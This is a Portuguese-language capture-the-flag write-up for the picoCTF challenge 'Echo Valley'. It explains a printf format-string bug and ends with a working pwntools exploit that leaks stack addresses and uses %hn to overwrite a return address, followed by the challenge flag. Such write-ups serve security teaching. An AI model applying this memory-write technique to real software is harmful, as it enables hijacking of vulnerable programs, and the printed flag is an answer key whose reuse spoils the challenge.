# Echo Valley

**Autor:** Shuailin Pan (LeConjuror)\
**Plataforma:** CyLab (picoCTF)\
**Categoria:** Binary Exploitation\
**Dificuldade:** Médio\
**Data:** 2025\

**Descrição do desafio:** 
> The echo valley is a simple function that echoes back whatever you say to it. But how do you make it respond with something more interesting, like a flag?

---

## 1. Análise do arquivo fornecido

O desafio entrega dois arquivos: o código-fonte `valley.c` e o binário `valley`. O programa lê linhas do usuário e as ecoa de volta. A função `print_flag()` existe, mas nunca é chamada. O objetivo é fazer o programa executá-la.

O loop principal fica em `echo_valley()`:

```c
while(1) {
    fflush(stdout);
    if (fgets(buf, sizeof(buf), stdin) == NULL) { ... }
    if (strcmp(buf, "exit\n") == 0) {
        printf("The Valley Disappears\n");
        break;
    }
    printf("You heard in the distance: ");
    printf(buf); // <- entrada do usuário usada como format string
    fflush(stdout);
}
```

Além disso, `print_flag()` abre `/home/valley/flag.txt` e imprime o conteúdo. Ela só é chamada por um desvio de execução.

**Proteções verificadas no binário:**

- **PIE:** o endereço base muda a cada execução.
- **Full RELRO (BIND_NOW):** a GOT é somente leitura.
- **Stack protector:** o canário é verificado no retorno da função, mas ele não é afetado se só o endereço de retorno for alterado.

---

## 2. Identificando a vulnerabilidade

A linha `printf(buf)` usa a entrada do usuário como **format string**. Com especificadores como `%p`, o programa imprime valores da pilha. Com `%n`, ele escreve na memória o número de caracteres impressos até então.

Testando com `%p`, descobri o layout de argumentos. Em `printf(buf)`, o `buf` fica no topo da pilha, então o argumento 6 é `buf[0]`, e o argumento N está em `buf + 8*(N-6)`.

**Primeira tentativa (fracassada):** sobrescrever a entrada da GOT de `fflush` com o endereço de `print_flag`. Isso dá `SIGSEGV` porque o Full RELRO torna a GOT somente leitura. A alternativa é sobrescrever o **endereço de retorno** de `echo_valley`, que fica na pilha.

Confirmei o layout com o gdb:

- `%20$p` vaza o `rbp` salvo de `main`. O endereço de retorno de `echo_valley` fica em `arg20 - 8`.
- `%21$p` vaza o endereço de retorno para dentro de `main`, que é `base + 0x1413`. Com ele, calculamos o endereço base.

---

## 3. Exploit final

A estratégia tem três passos:

1. Vazar o `rbp` de `main` e o endereço de retorno com `%20$p %21$p`.
2. Calcular o endereço base e o endereço do slot de retorno de `echo_valley`.
3. Gravar os 2 bytes baixos de `print_flag` no slot com `%hn`. Como o endereço base é alinhado em página, os bytes altos não mudam. Depois, enviar `exit`: `echo_valley` retorna para `print_flag`.

```python
import sys
from pwn import *

context.binary = elf = ELF('./valley', checksec=False)
context.log_level = 'error'

RET_OFF_IN_MAIN = 0x1413                 # retorno de echo_valley para dentro de main
PRINT_FLAG_OFF  = elf.sym['print_flag']  # 0x1269

def conn():
    if len(sys.argv) > 2:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process('./valley')

def build(W, slot):
    # %Wc imprime W caracteres; %K$hn grava W (16 bits) no endereço 'slot'
    for K in range(6, 200):
        head = b"%%%dc%%%d$hn" % (W, K)
        pad = (-len(head)) % 8
        if 6 + (len(head) + pad) // 8 == K:
            payload = head + b"a" * pad + p64(slot)
            if len(payload) < 99 and b"\n" not in payload:
                return payload
    raise ValueError("payload nao montado")

p = conn()
p.recvuntil(b"Try Shouting: \n")

# 1) Vazamento: arg20 = rbp de main, arg21 = endereço de retorno em main
p.sendline(b"%20$p %21$p")
main_rbp, ret = [int(x, 16) for x in p.recvline().split(b": ")[1].split()]

base = ret - RET_OFF_IN_MAIN
slot = main_rbp - 8                      # endereço salvo do retorno de echo_valley
W = (base + PRINT_FLAG_OFF) & 0xffff     # só os 2 bytes baixos mudam
print(f"[+] base={hex(base)} slot={hex(slot)} print_flag={hex(base + PRINT_FLAG_OFF)}")

# 2) Sobrescreve o retorno de echo_valley com print_flag
p.sendline(build(W, slot))

# 3) 'exit' faz echo_valley retornar -> cai em print_flag
p.sendline(b"exit")

out = p.recvall(timeout=3).decode(errors='ignore')
for line in out.splitlines():
    if line.strip(' ') and ('Congrats' in line or 'flag' in line.lower() or
                            line.startswith('pico') or line.startswith('academy')):
        print(line.strip())
```

## Flag

```
academy{f1ckl3_f0rmat_f1asc0}
```

---

**Autora da WriteUp:** [Membro de Exploitation - lieserl](https://github.com/lieserl-git)
